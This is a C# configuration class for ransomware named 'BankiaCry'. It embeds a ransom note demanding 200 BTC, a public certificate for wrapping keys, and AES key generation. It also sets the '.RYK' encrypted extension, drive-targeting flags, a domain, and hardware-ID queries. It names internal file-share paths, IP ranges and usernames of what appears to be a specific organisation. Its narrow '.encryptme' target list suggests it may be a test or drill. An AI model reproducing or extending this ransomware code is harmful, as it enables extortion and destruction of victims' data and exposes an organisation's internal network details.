using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace BankiaCry;

public class Config
{
	private const string publicKey = "MIIDazCCAlOgAwIBAgIUf9hL/RGgQyqvRgjtnjPJLldJNRswDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCUlUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0xOTEwMjYxMTE5MDRaFw0yOTEwMjMxMTE5MDRaMEUxCzAJBgNVBAYTAlJVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3V4F6LBoHr+g0xLGaLcHFWHYX3NDczZpKmIQDRTagBpZhGR/qxv3J/nWYZ9fa3163dMPpRdH6ZrK6nesPQgs/Upww445p3BAaUulY6aLIMLpeh79tNuCJ0ieQfbdq8JvwD0nUFT8JLObqRS6B+eAntgUIok7YBHYAme49VddlIaVEnRNKmMiVt0nnxcY/EqqPfNOvZ8Yqep/e4WMr9/5MPdUfGUc8kAo9DAQPkSEQLo4IMk+SJLPGSIgPZdY7j7Ex2fDUrzRPaHeajteW3qByZrE1HvGhD+JTtO5FLkTgyGrRcRTgB0nfpRp4nyE7LOWUUXfF3xVsUcdCE8tyJqNfAgMBAAGjUzBRMB0GA1UdDgQWBBTCYoOMHTzJ6T0/e7DX+3qBu6hxtDAfBgNVHSMEGDAWgBTCYoOMHTzJ6T0/e7DX+3qBu6hxtDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBBzQq94gmnIHwN9wbGOrB9ilmAqoUVlyuJjeeZnoY41vQgVOXkc0t2ybaPa5rcQ8++GQsxEqUf55Ks2mlN7CtGGgvWYr535n+x6VCkd/G2I3QreZgcl1FCRg7S/cwzQb2soPeBqPFKdya3el8UUzipa1gW9ueH2NQ+Ke40huM6ItbhCEs7tfzkbFO5L1jJm89gz7FGl8XdSQyl1QnnXhHlIJMcVxVZZIAHNL6mno0HRKmSkXFS0YrHqMT7yg/eIvnN29syZnUEqkwgqBB1vzzZw6Gvko8f+wba9bPmPenZ2JYb1P3RAwozvJSUaSyzC9ffgIZmcGRbNOThUr6K2ARW";

	private const string readme = "Your computer is encrypted!! All your data belongs to us!\r\nTo decrypt your data, please follow the instructions below.\r\n\t1. Issue a 200BTC payment to the following BitCoin address \r\t2. To make the payment go to https://buy.bitcoin.com and select Bitcoin Core.\r\t3. Then enter the required 200BTC quantity, and complete the process\r\nYou have until Jan 31 2020 to complete the payment.\r\nIf the payment is not received on time, the password to decrypt your data will be removed from our database.";

	public const bool EncryptNetworkDrives = false;

	public const bool EncryptPhysicalDrives = true;

	public const bool EncryptRemovableDrives = false;

	public const bool InDepthSearch = false;

	public const bool NetworkTouch = false;

	public static string cpindado = "cpindado".ToUpper();

	public static string gfernandezm = "gfernandezm".ToUpper();

	public static string cpindado_unc = "\\\\snasvf20\\aeficien\\".ToUpper();

	public static string gfernandezm_unc = "\\\\snasvf20\\comupres\\".ToUpper();

	public static List<string> Addresses = new List<string> { "10.64.125", "10.64.101", "10.64.95", "10.64.11" };

	private static HashSet<string> extensionsToEncrypt = new HashSet<string> { ".encryptme", ".encryptmeagain" };

	public static X509Certificate2 GetPublicCert()
	{
		return new X509Certificate2(Convert.FromBase64String("MIIDazCCAlOgAwIBAgIUf9hL/RGgQyqvRgjtnjPJLldJNRswDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCUlUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0xOTEwMjYxMTE5MDRaFw0yOTEwMjMxMTE5MDRaMEUxCzAJBgNVBAYTAlJVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3V4F6LBoHr+g0xLGaLcHFWHYX3NDczZpKmIQDRTagBpZhGR/qxv3J/nWYZ9fa3163dMPpRdH6ZrK6nesPQgs/Upww445p3BAaUulY6aLIMLpeh79tNuCJ0ieQfbdq8JvwD0nUFT8JLObqRS6B+eAntgUIok7YBHYAme49VddlIaVEnRNKmMiVt0nnxcY/EqqPfNOvZ8Yqep/e4WMr9/5MPdUfGUc8kAo9DAQPkSEQLo4IMk+SJLPGSIgPZdY7j7Ex2fDUrzRPaHeajteW3qByZrE1HvGhD+JTtO5FLkTgyGrRcRTgB0nfpRp4nyE7LOWUUXfF3xVsUcdCE8tyJqNfAgMBAAGjUzBRMB0GA1UdDgQWBBTCYoOMHTzJ6T0/e7DX+3qBu6hxtDAfBgNVHSMEGDAWgBTCYoOMHTzJ6T0/e7DX+3qBu6hxtDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBBzQq94gmnIHwN9wbGOrB9ilmAqoUVlyuJjeeZnoY41vQgVOXkc0t2ybaPa5rcQ8++GQsxEqUf55Ks2mlN7CtGGgvWYr535n+x6VCkd/G2I3QreZgcl1FCRg7S/cwzQb2soPeBqPFKdya3el8UUzipa1gW9ueH2NQ+Ke40huM6ItbhCEs7tfzkbFO5L1jJm89gz7FGl8XdSQyl1QnnXhHlIJMcVxVZZIAHNL6mno0HRKmSkXFS0YrHqMT7yg/eIvnN29syZnUEqkwgqBB1vzzZw6Gvko8f+wba9bPmPenZ2JYb1P3RAwozvJSUaSyzC9ffgIZmcGRbNOThUr6K2ARW"));
	}

	public static string GetReadmeContents()
	{
		return "Your computer is encrypted!! All your data belongs to us!\r\nTo decrypt your data, please follow the instructions below.\r\n\t1. Issue a 200BTC payment to the following BitCoin address \r\t2. To make the payment go to https://buy.bitcoin.com and select Bitcoin Core.\r\t3. Then enter the required 200BTC quantity, and complete the process\r\nYou have until Jan 31 2020 to complete the payment.\r\nIf the payment is not received on time, the password to decrypt your data will be removed from our database.";
	}

	public static byte[] GetRandomAESStuff()
	{
		char[] array = new char[16];
		for (int i = 0; i < 16; i++)
		{
			array[i] = GetRandomValidChar();
		}
		return Encoding.UTF8.GetBytes(array);
	}

	private static char GetRandomValidChar()
	{
		string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789*!.-()=%#+-";
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[8];
		rNGCryptoServiceProvider.GetBytes(array);
		ulong num = BitConverter.ToUInt64(array, 0);
		int index = (int)(num % (ulong)text.Length);
		return text[index];
	}

	public static string GetEncryptedExtension()
	{
		return ".RYK";
	}

	public static string GetDecryptedTermination()
	{
		return "_Decr_";
	}

	public static HashSet<string> GetExtensionsToEncrypt()
	{
		return extensionsToEncrypt;
	}

	public static string GetDomain()
	{
		return "bankia-server.com";
	}

	public static List<string> GetHWIDQueries()
	{
		string item = "SELECT SerialNumber from Win32_PhysicalMedia";
		string item2 = "SELECT SerialNumber from Win32_BaseBoard";
		string item3 = "SELECT SystemSKUNumber from Win32_ComputerSystem";
		return new List<string> { item, item2, item3 };
	}
}
